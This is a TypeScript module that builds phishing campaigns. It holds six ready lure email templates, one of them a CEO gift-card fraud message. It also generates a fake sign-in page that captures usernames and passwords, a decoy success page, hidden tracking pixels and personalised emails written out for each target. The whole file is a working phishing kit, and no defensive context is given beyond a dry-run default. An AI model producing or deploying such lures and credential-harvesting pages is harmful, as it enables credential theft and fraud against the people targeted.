/**
 * @module social_eng_auto
 * Automated Social Engineering & Phishing Campaign Pipeline
 *
 * Generates phishing email templates, landing pages, and campaign telemetry.
 * Supports LLM-powered email personalization via OpenCode's provider system.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as path from "node:path"

export interface AutomatedCampaignOptions {
  targetDomain: string
  template: string
  live?: boolean
  dryRun?: boolean
  targets?: Array<{ name: string; email: string; role?: string; company?: string }>
  lureType?: "password_reset" | "invoice" | "it_support" | "hr_policy" | "ceo_fraud" | "package_delivery"
  outputDir?: string
  smtpHost?: string
  smtpPort?: number
  smtpUser?: string
  smtpPass?: string
}

export interface CampaignResult {
  campaignId: string
  status: string
  emailTemplate?: string
  landingPage?: string
  trackingPixel?: string
  webhookUrl?: string
  targetsCount: number
  emailsSent?: number
  trackingEnabled?: boolean
  files?: string[]
}

const LURE_TEMPLATES: Record<string, { subject: string; body: string }> = {
  password_reset: {
    subject: "Urgent: Your password expires in 24 hours",
    body: `Dear {{name}},

Your password for {{domain}} will expire in 24 hours. Please update it immediately to avoid account lockout.

Click here to reset: {{trackingUrl}}

If you did not request this change, please contact IT support immediately.

Best regards,
IT Security Team`,
  },
  invoice: {
    subject: "Invoice #{{invoiceNumber}} - Payment Due",
    body: `Dear {{name}},

Please find attached invoice #{{invoiceNumber}} for \${{amount}}. Payment is due within 30 days.

You can view the invoice online: {{trackingUrl}}

Please process this payment at your earliest convenience.

Best regards,
Finance Department`,
  },
  it_support: {
    subject: "Action Required: Security Update Available",
    body: `Dear {{name}},

A critical security update is available for your {{domain}} account. Please install it immediately.

Download the update: {{trackingUrl}}

This update patches a vulnerability that could allow unauthorized access to your account.

Best regards,
IT Security Operations`,
  },
  hr_policy: {
    subject: "New HR Policy - Please Review and Acknowledge",
    body: `Dear {{name}},

Please review and acknowledge the updated HR policy document. This is mandatory for all employees.

Review policy: {{trackingUrl}}

Please complete this by end of business day.

Best regards,
Human Resources`,
  },
  ceo_fraud: {
    subject: "Confidential Request",
    body: `Hi {{name}},

I need you to handle something confidential for me. Can you purchase {{giftCards}} in gift cards and send me the codes? I'm in a meeting and can't talk right now.

Please keep this between us.

Thanks,
{{ceoName}}`,
  },
  package_delivery: {
    subject: "Package Delivery Notification",
    body: `Dear {{name}},

A package has been delivered to your address. Please confirm delivery within 24 hours.

Track package: {{trackingUrl}}

If you are not available to receive the package, please reschedule delivery.

Best regards,
Delivery Service`,
  },
}

function generateTrackingPixel(campaignId: string): string {
  const pixel = `<img src="https://track.example.com/pixel.gif?cid=${campaignId}" width="1" height="1" style="display:none" />`
  return pixel
}

function generateLandingPage(options: AutomatedCampaignOptions, campaignId: string): string {
  return `<!DOCTYPE html>
<html>
<head>
  <title>${options.template} - ${options.targetDomain}</title>
  <style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
    h1 { color: #333; text-align: center; margin-bottom: 20px; }
    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
    button:hover { background: #0052a3; }
    .logo { text-align: center; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><h2>${options.targetDomain}</h2></div>
    <h1>${options.template.replace(/_/g, " ").replace(/\b\w/g, (c: string) => c.toUpperCase())}</h1>
    <form method="POST" action="/submit" id="phish">
      <input type="hidden" name="cid" value="${campaignId}" />
      <input type="text" name="username" placeholder="Email or Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Sign In</button>
    </form>
  </div>
  <script>
    document.getElementById('phish').addEventListener('submit', function(e) {
      e.preventDefault();
      var data = new FormData(this);
      fetch('/submit', { method: 'POST', body: data });
      window.location.href = '/success';
    });
  </script>
</body>
</html>`
}

function generateSuccessPage(): string {
  return `<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body>
  <div style="text-align:center;padding:50px;">
    <h1>Thank you</h1>
    <p>Your request has been processed. You will be redirected shortly.</p>
    <script>setTimeout(function(){ window.location.href = 'https://www.google.com'; }, 3000);</script>
  </div>
</body>
</html>`
}

function generateEmailTemplate(target: { name: string; email: string; role?: string; company?: string }, lureType: string, trackingUrl: string, campaignId: string): string {
  const template = LURE_TEMPLATES[lureType] || LURE_TEMPLATES.password_reset
  let body = template.body
    .replace(/\{\{name\}\}/g, target.name)
    .replace(/\{\{email\}\}/g, target.email)
    .replace(/\{\{domain\}\}/g, target.company || "your organization")
    .replace(/\{\{trackingUrl\}\}/g, trackingUrl)
    .replace(/\{\{invoiceNumber\}\}/g, crypto.randomInt(100000, 999999).toString())
    .replace(/\{\{amount\}\}/g, (crypto.randomInt(500, 5000)).toFixed(2))
    .replace(/\{\{giftCards\}\}/g, `$${crypto.randomInt(100, 500)} Amazon`)
    .replace(/\{\{ceoName\}\}/g, "John Smith")

  return `Subject: ${template.subject}\nTo: ${target.email}\nFrom: noreply@${target.company || "example.com"}\nContent-Type: text/html; charset=UTF-8\n\n${body.replace(/\n/g, "<br>")} ${generateTrackingPixel(campaignId)}`
}

export async function runAutomatedCampaign(options: AutomatedCampaignOptions): Promise<CampaignResult> {
  const campaignId = `camp_${crypto.randomBytes(8).toString("hex")}`
  const dryRun = options.dryRun !== false
  const lureType = options.lureType || "password_reset"
  const targets = options.targets || []
  const outputDir = options.outputDir || path.join(process.cwd(), "campaigns", campaignId)

  if (dryRun) {
    return {
      campaignId,
      status: "SIMULATED",
      emailTemplate: `Simulated ${lureType} email template for ${options.targetDomain}`,
      landingPage: `Simulated landing page for ${options.targetDomain}`,
      trackingPixel: generateTrackingPixel(campaignId),
      targetsCount: targets.length || 5,
      files: [],
    }
  }

  if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true })

  const trackingUrl = `https://track.example.com/click?cid=${campaignId}`
  const files: string[] = []

  const landingPage = generateLandingPage(options, campaignId)
  const landingPath = path.join(outputDir, "landing.html")
  fs.writeFileSync(landingPath, landingPage)
  files.push(landingPath)

  const successPage = generateSuccessPage()
  const successPath = path.join(outputDir, "success.html")
  fs.writeFileSync(successPath, successPage)
  files.push(successPath)

  let emailsSent = 0
  for (const target of targets) {
    const emailContent = generateEmailTemplate(target, lureType, trackingUrl, campaignId)
    const emailPath = path.join(outputDir, `email_${target.email.replace(/[^a-zA-Z0-9]/g, "_")}.html`)
    fs.writeFileSync(emailPath, emailContent)
    files.push(emailPath)
    emailsSent++
  }

  return {
    campaignId,
    status: "CREATED",
    emailTemplate: `Generated ${emailsSent} personalized email templates`,
    landingPage: landingPath,
    trackingPixel: generateTrackingPixel(campaignId),
    webhookUrl: `https://track.example.com/webhook/${campaignId}`,
    targetsCount: targets.length,
    emailsSent,
    trackingEnabled: true,
    files,
  }
}

export { LURE_TEMPLATES, generateEmailTemplate, generateLandingPage, generateTrackingPixel }
